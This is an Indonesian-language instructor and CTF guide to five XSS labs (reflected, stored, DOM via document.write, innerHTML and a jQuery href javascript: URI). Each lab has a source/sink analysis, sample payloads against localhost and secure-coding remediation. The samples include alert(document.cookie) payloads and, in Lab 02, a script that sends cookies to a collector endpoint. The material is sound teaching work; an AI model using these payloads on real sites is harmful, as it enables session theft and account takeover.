# Catatan Internal & Panduan Edukasi: XSS Lab Series

Dokumen ini ditujukan khusus bagi instruktur, problem setter CTF, dan pengembang untuk memahami tujuan pembelajaran, analisis *source* dan *sink*, alur eksploitasi, serta mitigasi keamanan untuk setiap lab.

---

## Lab 01: Reflected XSS into HTML context with nothing encoded

### 🎯 Tujuan Pembelajaran
Memahami konsep dasar *Reflected Cross-Site Scripting* di mana input dari pengguna yang dikirim via parameter HTTP request dipantulkan secara langsung oleh server ke dalam respon HTML tanpa encoding kontekstual.

### 🔍 Analisis Kerentanan
- **Vulnerability Type**: Reflected XSS (Server-Side)
- **Source**: `req.query.search` (HTTP GET parameter `search`)
- **Sink**: Respon HTML mentah di template EJS:
  ```html
  <h3>Results for: <%- search %></h3>
  ```
- **Penyebab**: Penggunaan tag unescaped `<%- %>` alih-alih escaped tag `<%= %>` dalam engine template EJS.

### 💡 Contoh Eksploitasi
```html
<script>alert(document.cookie)</script>
```
atau
```html
<img src=x onerror=alert(document.domain)>
```
URL:
`http://localhost:3000/lab01?search=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

### 🛡️ Remediasi (Secure Coding)
1. Gunakan contextual HTML entity encoding pada semua data yang berasal dari luar sebelum dirender ke HTML body:
   ```html
   <!-- Di EJS gunakan <%= %> untuk auto-escape karakter <, >, &, ", ' -->
   <h3>Results for: <%= search %></h3>
   ```
2. Terapkan *Content Security Policy* (CSP) yang membatasi eksekusi inline script yang tidak terpercaya.

---

## Lab 02: Stored XSS into HTML context with nothing encoded

### 🎯 Tujuan Pembelajaran
Memahami bahaya *Stored (Persistent) Cross-Site Scripting* di mana data berbahaya disimpan secara permanen di database, kemudian dieksekusi setiap kali pengunjung lain membuka halaman yang memuat data tersebut. Memahami pula perbedaan antara mitigasi SQLi (parameterized queries) dengan mitigasi XSS (output encoding).

### 🔍 Analisis Kerentanan
- **Vulnerability Type**: Stored XSS (Persistent)
- **Source**: Input form POST `/lab02/comment` (`req.body.content`) disimpan ke SQLite via parameterized query.
- **Sink**: Respon HTML mentah saat komentar ditampilkan:
  ```html
  <div class="comment-body">
    <%- comment.content %>
  </div>
  ```
- **Penyebab**: Aplikasi mengamankan lapisan database dari SQL Injection menggunakan parameterized query, namun melupakan sanitasi/encoding pada *presentation layer* (HTML output).

### 💡 Contoh Eksploitasi
Kirim komentar melalui form dengan isi:
```html
<script>
  fetch('/collector/team1?cookie=' + encodeURIComponent(document.cookie));
</script>
```
atau payload sederhana:
```html
<img src=x onerror=alert(document.cookie)>
```

### 🛡️ Remediasi (Secure Coding)
1. Encode konten teks saat dirender ke HTML:
   ```html
   <div class="comment-body">
     <%= comment.content %>
   </div>
   ```
2. Jika fitur membutuhkan format HTML kaya (rich text), gunakan parser/sanitizer terpercaya seperti `DOMPurify` atau `sanitize-html` di server sebelum merender ke klien.

---

## Lab 03: DOM XSS in document.write sink using location.search

### 🎯 Tujuan Pembelajaran
Memahami kerentanan *DOM-based XSS* yang terjadi sepenuhnya di sisi klien (browser) ketika data dari *source* DOM yang dapat dikontrol penyerang dialirkan ke *execution sink* berbahaya seperti `document.write`.

### 🔍 Analisis Kerentanan
- **Vulnerability Type**: DOM-based XSS
- **Source**: `location.search` (`(new URLSearchParams(window.location.search)).get('search')`)
- **Sink**: `document.write('<img src="/images/tracker.gif?searchTerms=' + query + '">')`
- **Penyebab**: Data dari URL disisipkan langsung ke dalam string HTML yang kemudian diparsing oleh parser browser melalui `document.write`.

### 💡 Contoh Eksploitasi
Karakter `">` digunakan untuk menutup tag `<img>`, kemudian dilanjutkan dengan tag skrip atau elemen pembawa event:
```text
"><script>alert(document.cookie)</script>
```
atau menggunakan event handler:
```text
"><svg onload=alert(document.cookie)>
```
URL:
`http://localhost:3000/lab03?search=%22%3E%3Csvg%20onload=alert(document.cookie)%3E`

### 🛡️ Remediasi (Secure Coding)
1. Hindari penggunaan `document.write`. Gunakan API manipulasi DOM yang aman (safe DOM APIs):
   ```javascript
   var img = document.createElement('img');
   img.src = '/images/tracker.gif?searchTerms=' + encodeURIComponent(query);
   document.getElementById('trackerContainer').appendChild(img);
   ```
2. Gunakan `encodeURIComponent()` pada nilai parameter sebelum membentuk URL string.

---

## Lab 04: DOM XSS in innerHTML sink using location.search

### 🎯 Tujuan Pembelajaran
Mengenal karakteristik manipulasi properti `element.innerHTML` di sisi klien. Peserta belajar bahwa meskipun tag `<script>` tidak dieksekusi oleh browser modern saat disisipkan melalui `innerHTML` (sesuai standar HTML5), penyerang tetap dapat mengeksekusi JavaScript menggunakan tag HTML alternatif yang memiliki event listener seperti `<img onerror=...>` atau `<svg onload=...>`.

### 🔍 Analisis Kerentanan
- **Vulnerability Type**: DOM-based XSS
- **Source**: `location.search` (`(new URLSearchParams(window.location.search)).get('search')`)
- **Sink**: `banner.innerHTML = '<h3>Results for: ' + query + '</h3>'`
- **Penyebab**: Mengubah pohon DOM melalui string HTML mentah yang mengandung input yang tidak disanitasi.

### 💡 Contoh Eksploitasi
Jika penyerang menyisipkan `<script>alert(1)</script>`, script **tidak akan berjalan** karena proteksi bawaan HTML5 untuk `innerHTML`. Penyerang harus menggunakan elemen alternatif dengan inline event listener:
```html
<img src=x onerror=alert(document.cookie)>
```
atau
```html
<iframe src="javascript:alert(document.cookie)"></iframe>
```
URL:
`http://localhost:3000/lab04?search=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E`

### 🛡️ Remediasi (Secure Coding)
1. Gunakan `element.textContent` atau `element.innerText` jika hanya ingin menampilkan teks ke pengguna:
   ```javascript
   banner.textContent = 'Results for: ' + query;
   ```
2. Jika perlu menyusun elemen terstruktur, gunakan `document.createElement()` dan manipulasi `textContent` masing-masing node anak.

---

## Lab 05: DOM XSS in jQuery anchor href sink using location.search

### 🎯 Tujuan Pembelajaran
Memahami kerentanan DOM XSS pada manipulasi atribut navigasi tautan (`href`) menggunakan pustaka seperti jQuery. Memahami bahwa XSS tidak hanya terjadi melalui injeksi tag HTML baru, tetapi juga melalui manipulasi skema URI (misalnya skema `javascript:`).

### 🔍 Analisis Kerentanan
- **Vulnerability Type**: DOM-based XSS / JavaScript URI Injection
- **Source**: `location.search` (`urlParams.get('returnPath')`)
- **Sink**: `$('#backLink').attr('href', returnPath)`
- **Penyebab**: Atribut `href` pada elemen anchor `<a>` langsung diisi nilai dari query parameter tanpa memvalidasi apakah nilai tersebut adalah URL HTTP/HTTPS yang valid, relative path, atau skema berbahaya (`javascript:`).

### 💡 Contoh Eksploitasi
Penyerang membuat tautan dengan parameter:
```text
returnPath=javascript:alert(document.cookie)
```
URL:
`http://localhost:3000/lab05?returnPath=javascript:alert(document.cookie)`

Ketika korban (atau bot verifikasi CTF) mengklik tombol `Back`, browser akan mengeksekusi kode JavaScript yang ada di dalam skema `javascript:`.

### 🛡️ Remediasi (Secure Coding)
1. Validasi ketat format `returnPath` (misalnya harus diawali dengan `/` dan tidak mengandung `//` atau titik dua `:`):
   ```javascript
   function isSafeRelativeUrl(url) {
     return typeof url === 'string' && url.startsWith('/') && !url.startsWith('//') && !url.includes(':');
   }

   if (returnPath && isSafeRelativeUrl(returnPath)) {
     $('#backLink').attr('href', returnPath);
   } else {
     $('#backLink').attr('href', '/');
   }
   ```
2. Hindari menerima URI skema arbitrary dari parameter query pengguna.
